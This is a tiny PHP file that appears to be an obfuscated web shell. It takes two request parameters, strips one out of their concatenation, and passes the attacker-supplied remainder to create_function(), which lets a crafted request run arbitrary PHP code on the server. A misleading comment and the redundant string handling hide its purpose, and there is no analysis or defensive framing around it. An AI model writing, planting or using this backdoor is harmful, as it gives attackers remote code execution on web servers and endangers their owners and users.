<?php

$aa=@$_REQUEST['aa'];//没用

$bb=@$_REQUEST['bb'];

$cc=$aa.$bb;

$dd=str_replace($aa,'',$cc);

$fun=create_function('',$dd);

?>  